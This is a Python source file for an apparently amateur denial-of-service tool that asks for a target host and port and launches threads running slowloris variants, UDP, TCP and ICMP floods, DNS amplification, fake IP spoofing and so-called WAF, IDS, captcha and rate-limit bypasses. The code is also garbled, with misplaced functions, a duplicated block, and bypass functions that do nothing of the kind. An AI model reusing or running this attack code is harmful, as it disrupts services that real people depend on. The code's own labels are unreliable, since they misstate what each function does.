import socket
import random
import threading
import time
import requests

class FMSW:
    def __init__(self, target, port, threads):
        self.target = target
        self.port = port
        self.threads = threads
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.is_running = False
        self.attack_duration = 300
        self.attack_interval = 10
        self.max_connections = 1000
        self.headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate, br",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
        ]
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36"
        ]
        self.random_user_agent = random.choice(self.user_agents)

    def ddos(self):
        print("Attack Is started")
        self.is_running = True

        def stop_attack():
            time.sleep(self.attack_duration)
            self.is_running = False
            print("Attack Is paused")
            time.sleep(60)
            self.sock.close()

        def change_duration(duration):
            self.attack_duration = duration

        def change_interval(interval):
            self.attack_interval = interval

        def change_connections(connections):
            self.max_connections = connections

        def flood_dns():
            while self.is_running:
                try:
                    print("Successful flood_dns attack.")
                    requests.get("http://api.abuseipdb.com/api/v2/report", params={"ip": self.target, "categories": "21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40"}, headers={"Key": "API_KEY"})
                except Exception as e:
                    print(f"Failed in flood_dns: {e}")
                    pass
                time.sleep(1)
                
        def rotate_user_agent():
            while self.is_running:
                self.random_user_agent = random.choice(self.user_agents)
                print(f"User-Agent changed to: {self.random_user_agent}")
                time.sleep(30)

        def reset_settings():
            self.attack_duration = 300
            self.attack_interval = 10
            self.max_connections = 1000
            self.random_user_agent = random.choice(self.user_agents)
            print("Settings reset to default values.")

        def spoof_ip():
            while self.is_running:
                fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.connect((self.target, self.port))
                    s.sendto(fake_ip.encode(), (self.target, self.port))
                    s.close()
                    print(f"Packet sent from spoofed IP: {fake_ip}")
                except Exception as e:
                    print(f"Failed to send packet from spoofed IP: {fake_ip}, Error: {e}")
                time.sleep(1)

        def slowloris():
            while self.is_running:
                try:
                    headers = {"Host": self.target}
                    s = socket.create_connection((self.target, self.port))
                    for _ in range(200):
                        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                    s.send("\r\n".encode())
                    print("Slowloris attack executed successfully.")
                except Exception as e:
                    print(f"Failed to execute slowloris attack: {e}")
                finally:
                    s.close()
                time.sleep(15)
       
        stop_thread = threading.Thread(target=stop_attack)
        stop_thread.start()
        print("Stop thread started.")

        duration_thread = threading.Thread(target=change_duration, args=(600,))
        duration_thread.start()
        print("Duration thread started.")

        interval_thread = threading.Thread(target=change_interval, args=(5,)) 
        interval_thread.start()
        print("Interval thread started.")

        connections_thread = threading.Thread(target=change_connections, args=(2000,))
        connections_thread.start()
        print("Connections thread started.")

        dns_thread = threading.Thread(target=flood_dns)
        dns_thread.start()
        print("DNS flood thread started.")

        user_agent_thread = threading.Thread(target=rotate_user_agent)
        user_agent_thread.start()
        print("User agent rotation thread started.")

        reset_thread = threading.Thread(target=reset_settings)
        reset_thread.start()
        print("Settings reset thread started.")

        spoof_ip_thread = threading.Thread(target=spoof_ip)
        spoof_ip_thread.start()
        print("IP spoofing thread started.")

        slowloris_thread = threading.Thread(target=slowloris)
        slowloris_thread.start()
        print("Slowloris attack thread started.")

def tcp_flood(self):
    while self.is_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target, self.port))
            s.sendto(random._urandom(1024), (self.target, self.port))
            s.close()
            print(" tcp_flood success.")
        except Exception as e:
            print(f""" tcp_flood Failed 
            
            Why: {e}""")
        time.sleep(0.1)

def http_flood(self):
    while self.is_running:
        try:
            url = f"http://{self.target}:{self.port}/"
            requests.get(url, headers=random.choice(self.headers))
            print(" http_flood Success.")
        except Exception as e:
            print(f"""Failed http_flood  
            
            Why : {e}""")
        time.sleep(0.5)

def udp_flood(self):
    while self.is_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(random._urandom(1024), (self.target, self.port))
            s.close()
            print(" udp_flood Success")
        except Exception as e:
            print(f""" udp_flood Failed 
            
            Why : {e}""")
        time.sleep(0.1)

def icmp_flood(self):
    while self.is_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            s.sendto(random._urandom(1024), (self.target, 0))
            s.close()
            print(" icmp_flood success.")
        except Exception as e:
            print(f""" icmp_flood Failed 
            
            Why : : {e}""")
        time.sleep(0.1)

def dns_amplification(self):
    while self.is_running:
        try:
            query = bytearray()
            query.append(random.randint(0, 255))
            query.append(random.randint(0, 255))
            query.append(1)
            query.append(0)
            query.append(0)
            query.append(1)
            query.append(0)
            query.append(0)
            query.append(0)
            query.append(0)
            query.append(0)
            query.append(0)
            query.extend(map(ord, self.target))
            query.extend([0, 0, 1, 0, 1])
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(query, ("DNS_SERVER_IP", 53))
            s.close()
            print("تم تنفيذ هجوم dns_amplification بنجاح.")
        except Exception as e:
            print(f"فشل في تنفيذ هجوم dns_amplification: {e}")
        time.sleep(0.1)

def slowloris_plus(self):
    while self.is_running:
        try:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}
            conn = socket.create_connection((self.target, self.port))
            for _ in range(10):
                conn.send(b"GET / HTTP/1.1\r\n")
                for key, value in headers.items():
                    conn.send(f"{key}: {value}\r\n".encode())
                conn.send(b"\r\n")
                time.sleep(10)
            print("Slowloris Plus: Successful")
        except Exception as e:
            print(f"Slowloris Plus: Failed - {e}")

def slow_post(self):
    while self.is_running:
        try:
            conn = socket.create_connection((self.target, self.port))
            conn.send(b"POST / HTTP/1.1\r\n")
            conn.send(b"Host: " + self.target.encode() + b"\r\n")
            conn.send(b"Content-Length: 524288\r\n")
            conn.send(b"\r\n")
            conn.send(random._urandom(524288))
            time.sleep(15)
            print("Slow POST: Successful")
        except Exception as e:
            print(f"Slow POST: Failed - {e}")

    def slow_headers(self):
        while self.is_running:
            try:
                headers = {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Cache-Control": "max-age=0",
                    "Connection": "keep-alive",
                    "Referer": "http://www.google.com",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": random.choice(self.user_agents)
                }
                conn = socket.create_connection((self.target, self.port))
                for _ in range(10):
                    conn.send(b"GET / HTTP/1.1\r\n")
                    for key, value in headers.items():
                        conn.send(f"{key}: {value}\r\n".encode())
                    conn.send(b"\r\n")
                    time.sleep(10)
                print("Slow Headers: Successful")
            except Exception as e:
                print(f"Slow Headers: Failed - {e}")

def slow_range(self):
        while self.is_running:
            try:
                headers = {"Range": "bytes=0-1000000"}
                conn = socket.create_connection((self.target, self.port))
                for _ in range(10):
                    conn.send(b"GET / HTTP/1.1\r\n")
                    for key, value in headers.items():
                        conn.send(f"{key}: {value}\r\n".encode())
                    conn.send(b"\r\n")
                    time.sleep(10)
                print("Slow Range: Successful")
            except Exception as e:
                print(f"Slow Range: Failed - {e}")

def slow_cookie(self):
        while self.is_running:
            try:
                headers = {"Cookie": "name=value"}
                conn = socket.create_connection((self.target, self.port))
                for _ in range(10):
                    conn.send(b"GET / HTTP/1.1\r\n")
                    for key, value in headers.items():
                        conn.send(f"{key}: {value}\r\n".encode())
                    conn.send(b"\r\n")
                    time.sleep(10)
                print("Slow Cookie: Successful")
            except Exception as e:
                print(f"Slow Cookie: Failed - {e}")

def slow_referer(self):
        while self.is_running:
            try:
                headers = {"Referer": "http://www.google.com"}
                conn = socket.create_connection((self.target, self.port))
                for _ in range(10):
                    conn.send(b"GET / HTTP/1.1\r\n")
                    for key, value in headers.items():
                        conn.send(f"{key}: {value}\r\n".encode())
                    conn.send(b"\r\n")
                    time.sleep(10)
                print("Slow Referer: Successful")
            except Exception as e:
                print(f"Slow Referer: Failed - {e}")

def slow_accept_language(self):
        while self.is_running:
            try:
                headers = {"Accept-Language": "en-US,en;q=0.9"}
                conn = socket.create_connection((self.target, self.port))
                for _ in range(10):
                    conn.send(b"GET / HTTP/1.1\r\n")
                    for key, value in headers.items():
                        conn.send(f"{key}: {value}\r\n".encode())
                    conn.send(b"\r\n")
                    time.sleep(10)
                print("Slow Accept-Language: Successful")
            except Exception as e:
                print(f"Slow Accept-Language: Failed - {e}")

def slow_accept_encoding(self):
        while self.is_running:
            try:
                headers = {"Accept-Encoding": "gzip, deflate"}
                conn = socket.create_connection((self.target, self.port))
                for _ in range(10):
                    conn.send(b"GET / HTTP/1.1\r\n")
                    for key, value in headers.items():
                        conn.send(f"{key}: {value}\r\n".encode())
                    conn.send(b"\r\n")
                    time.sleep(10)
                print("Slow Accept-Encoding: Successful")
            except Exception as e:
                print(f"Slow Accept-Encoding: Failed - {e}")

def slow_referer2(self):
        while self.is_running:
            try:
                headers = {"Referer": "http://www.example.com"}
                conn = socket.create_connection((self.target, self.port))
                for _ in range(10):
                    conn.send(b"GET / HTTP/1.1\r\n")
                    for key, value in headers.items():
                        conn.send(f"{key}: {value}\r\n".encode())
                    conn.send(b"\r\n")
                    time.sleep(10)
                print("Slow Referer2: Successful")
            except Exception as e:
                print(f"Slow Referer2: Failed - {e}")

def slow_cookie2(self):
        while self.is_running:
            try:
                headers = {"Cookie": "name=value; Domain=example.com; Path=/"}
                conn = socket.create_connection((self.target, self.port))
                for _ in range(10):
                    conn.send(b"GET / HTTP/1.1\r\n")
                    for key, value in headers.items():
                        conn.send(f"{key}: {value}\r\n".encode())
                    conn.send(b"\r\n")
                    time.sleep(10)
                print("Slow Cookie2: Successful")
            except Exception as e:
                print(f"Slow Cookie2: Failed - {e}")

def slow_referer3(self):
        while self.is_running:
            try:
                headers = {"Referer": "http://www.test.com"}
                conn = socket.create_connection((self.target, self.port))
                for _ in range(10):
                    conn.send(b"GET / HTTP/1.1\r\n")
                    for key, value in headers.items():
                        conn.send(f"{key}: {value}\r\n".encode())
                    conn.send(b"\r\n")
                    time.sleep(10)
                print("Slow Referer3: Successful")
            except Exception as e:
                print(f"Slow Referer3: Failed - {e}")

def slow_user_agent(self):
        while self.is_running:
            try:
                headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}
                conn = socket.create_connection((self.target, self.port))
                for _ in range(10):
                    conn.send(b"GET / HTTP/1.1\r\n")
                    for key, value in headers.items():
                        conn.send(f"{key}: {value}\r\n".encode())
                    conn.send(b"\r\n")
                    time.sleep(10)
                print("Slow User-Agent: Successful")
            except Exception as e:
                print(f"Slow User-Agent: Failed - {e}")

def slow_connection(self):
        while self.is_running:
            try:
                headers = {"Connection": "keep-alive"}
                conn = socket.create_connection((self.target, self.port))
                for _ in range(10):
                    conn.send(b"GET / HTTP/1.1\r\n")
                    for key, value in headers.items():
                        conn.send(f"{key}: {value}\r\n".encode())
                    conn.send(b"\r\n")
                    time.sleep(10)
                print("Slow Connection: Successful")
            except Exception as e:
                print(f"Slow Connection: Failed - {e}")

def slow_cookie4(self):
        while self.is_running:
            try:
                headers = {"Cookie": "name=value; Domain=anotherexample.com; Path=/"}
                conn = socket.create_connection((self.target, self.port))
                for _ in range(10):
                    conn.send(b"GET / HTTP/1.1\r\n")
                    for key, value in headers.items():
                        conn.send(f"{key}: {value}\r\n".encode())
                    conn.send(b"\r\n")
                    time.sleep(10)
                print("Slow Cookie4: Successful")
            except Exception as e:
                print(f"Slow Cookie4: Failed - {e}")

        stop_thread = threading.Thread(target=stop_attack)
        stop_thread.start()
        print("Stop thread started.")

        duration_thread = threading.Thread(target=change_duration, args=(600,))
        duration_thread.start()
        print("Duration thread started.")

        interval_thread = threading.Thread(target=change_interval, args=(5,)) 
        interval_thread.start()
        print("Interval thread started.")

        connections_thread = threading.Thread(target=change_connections, args=(2000,))
        connections_thread.start()
        print("Connections thread started.")

        dns_thread = threading.Thread(target=flood_dns)
        dns_thread.start()
        print("DNS flood thread started.")

        user_agent_thread = threading.Thread(target=rotate_user_agent)
        user_agent_thread.start()
        print("User agent rotation thread started.")

        reset_thread = threading.Thread(target=reset_settings)
        reset_thread.start()
        print("Settings reset thread started.")

        spoof_ip_thread = threading.Thread(target=spoof_ip)
        spoof_ip_thread.start()
        print("IP spoofing thread started.")

        slowloris_thread = threading.Thread(target=slowloris)
        slowloris_thread.start()
        print("Slowloris attack thread started.")
        
def bypass_protection(self):
        while self.is_running:
            try:
                headers = {
                    "X-XSS-Protection": "0",
                    "Content-Security-Policy": "default-src 'self'",
                    "X-Content-Type-Options": "nosniff",
                    "X-Frame-Options": "SAMEORIGIN",
                    "Referrer-Policy": "no-referrer-when-downgrade",
                    "Feature-Policy": "camera 'none'; microphone 'none'",
                    "Strict-Transport-Security": "max-age=31536000; includeSubDomains; preload",
                    "Access-Control-Allow-Origin": "*"
                }
                conn = socket.create_connection((self.target, self.port))
                for _ in range(10):
                    conn.send(b"GET / HTTP/1.1\r\n")
                    for key, value in headers.items():
                        conn.send(f"{key}: {value}\r\n".encode())
                    conn.send(b"\r\n")
                    time.sleep(10)
                print("Bypass Protection: Successful")
            except Exception as e:
                print(f"Bypass Protection: Failed - {e}")

def bypass_ids_ips(self):
        while self.is_running:
            try:
                url = f"http://{self.target}:{self.port}/"
                headers = {"User-Agent": random.choice(self.user_agents)}
                requests.get(url, headers=headers, verify=False, proxies={"http": "http://127.0.0.1:8080"})
                print("Bypass IDS/IPS: Successful")
            except Exception as e:
                print(f"Bypass IDS/IPS: Failed - {e}")
            time.sleep(0.5)
        
def bypass_firewalls(self):
        while self.is_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((self.target, self.port))
                s.sendto(random._urandom(1024), (self.target, self.port))
                s.close()
                print("Bypass Firewalls: Successful")
            except Exception as e:
                print(f"Bypass Firewalls: Failed - {e}")
            time.sleep(0.1)

def bypass_rate_limiting(self):
        while self.is_running:
            try:
                url = f"http://{self.target}:{self.port}/"
                headers = {"X-Forwarded-For": "127.0.0.1"}
                requests.get(url, headers=headers)
                print("Bypass Rate Limiting: Successful")
            except Exception as e:
                print(f"Bypass Rate Limiting: Failed - {e}")
            time.sleep(0.5)

def bypass_captcha(self):
        while self.is_running:
            try:
                url = f"http://{self.target}:{self.port}/"
                headers = {"User-Agent": random.choice(self.user_agents)}
                requests.get(url, headers=headers, cookies={"captcha": "false"})
                print("Bypass Captcha: Successful")
            except Exception as e:
                print(f"Bypass Captcha: Failed - {e}")
            time.sleep(0.5)

def bypass_ip_blocking(self):
        while self.is_running:
            try:
                url = f"http://{self.target}:{self.port}/"
                headers = {"User-Agent": random.choice(self.user_agents)}
                requests.get(url, headers=headers, timeout=1)
                print("Bypass IP Blocking: Successful")
            except Exception as e:
                print(f"Bypass IP Blocking: Failed - {e}")
            time.sleep(0.5)

def bypass_waf(self):
        while self.is_running:
            try:
                url = f"http://{self.target}:{self.port}/"
                headers = {"User-Agent": random.choice(self.user_agents)}
                requests.get(url, headers=headers, allow_redirects=False)
                print("Bypass WAF: Successful")
            except Exception as e:
                print(f"Bypass WAF: Failed - {e}")
            time.sleep(0.5)


if __name__ == "__main__":
    target = input("[!] -Target :")
    port = int(input("[!] -Port :"))

    threads = int(input("[!] -Attack rate ex(1000) :"))

    fmsw = FMSW(target, port, threads)
    fmsw.ddos()
